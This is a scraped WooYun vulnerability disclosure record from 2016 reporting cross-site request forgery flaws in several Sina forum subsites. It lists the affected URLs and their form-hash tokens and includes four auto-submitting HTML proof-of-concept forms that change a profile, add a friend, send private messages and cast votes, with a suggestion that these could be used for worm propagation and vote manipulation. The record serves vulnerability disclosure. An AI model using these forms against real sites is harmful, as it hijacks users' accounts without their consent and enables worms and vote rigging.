{"id": 84920, "wybug_id": "wooyun-2016-0180311", "wybug_title": "新浪论坛CSRF打包及危害说明（多个子论坛通用）", "wybug_corp": "新浪", "wybug_author": "xyntax", "wybug_date": "2016-03-03 09:38", "wybug_open_date": "2016-03-03 11:11", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["蠕虫"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-03：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： rt 详细说明：  此漏洞涉及到的新浪子论坛包括但不限于以下站点星座 http://club.astro.sina.com.cn/     b4201dfd数码 http://club.tech.sina.com.cn/      b4201dfd百味 http://club.news.sina.com.cn/      b4201dfd生活 http://club.life.sina.com.cn/      b4201dfd女性 http://club.eladies.sina.com.cn/   4788b761历史 http://club.history.sina.com.cn/   b4201dfd军事 http://club.mil.news.sina.com.cn/  b4201dfd体育 http://club.baby.sina.com.cn/      b4201dfd亲子 http://club.baby.sina.com.cn/      aec0506d该论坛模板未检验referrer且无有效token验证造成CSRF可利用点主要有：\n\n\n\n其中可以利用CSRF修改个人资料发送短消息（有“发送给全部好友”功能，正好方便蠕虫利用）利用蠕虫+投票系统可以实现刷票，刷关注，刷收藏等等post中没有检验referrer，唯一有区分的是formhash参数，这个参数在各个论坛的值已在前文url后面标明   漏洞证明：  以亲子论坛为例，时间有限只测试了四个位置，估计整个论坛都没有做csrf的防护，其他重要位置还请自行检测^_^1 修改用户信息\n<form action=\"http://club.baby.sina.com.cn/memcp.php?action=profile&typeid=2\" method=\"post\"> <input type=\"hidden\" name=\"formhash\" value=\"aec0506d\" /> <input type=\"hidden\" name=\"nicknamenew\" value=\"GAY21888\" /> <input type=\"hidden\" name=\"gendernew\" value=\"0\" /> <input type=\"hidden\" name=\"bdaynew\" value=\"0000-00-00\" /> <input type=\"hidden\" name=\"locationnew\" value=\"\" /> <input type=\"hidden\" name=\"sitenew\" value=\"\" /> <input type=\"hidden\" name=\"qqnew\" value=\"\" /> <input type=\"hidden\" name=\"msnnew\" value=\"\" /> <input type=\"hidden\" name=\"taobaonew\" value=\"\" /> <input type=\"hidden\" name=\"alipaynew\" value=\"\" /> <input type=\"hidden\" name=\"editsubmit\" value=\"true\" /> <script> document.forms[0].submit(); </script> </form>\n\n\n2 添加好友\n<form action=\"http://club.baby.sina.com.cn/default.php\" method=\"post\"> <input type=\"hidden\" name=\"s\" value=\"user\" /> <input type=\"hidden\" name=\"a\" value=\"addfriend\" /> <input type=\"hidden\" name=\"uid\" value=\"2055838954\" /> <script> document.forms[0].submit(); </script> </form>\n点击该页面后返回值为1表示添加成功，-3表示未登陆，-7表示已有该好友\n\n3 向好友发送短消息\n<form action=\"http://club.baby.sina.com.cn/pm.php?action=send&pmsubmit=yes\" method=\"post\"> <input type=\"hidden\" name=\"formhash\" value=\"aec0506d\" /> <input type=\"hidden\" name=\"msgto\" value=\"\" /> <input type=\"hidden\" name=\"msgtobuddys%5B%5D\" value=\"2055838954\" /> <input type=\"hidden\" name=\"subject\" value=\"test\" /> <input type=\"hidden\" name=\"message\" value=\"test\" /> <script> document.forms[0].submit(); </script> </form>\n\n\n4 刷投票我删了cookies截的图\n\n可以看到投票成功\n\n   修复方案：  你们更专业！   版权声明：转载请注明来源 xyntax@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-03-03 11:11 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}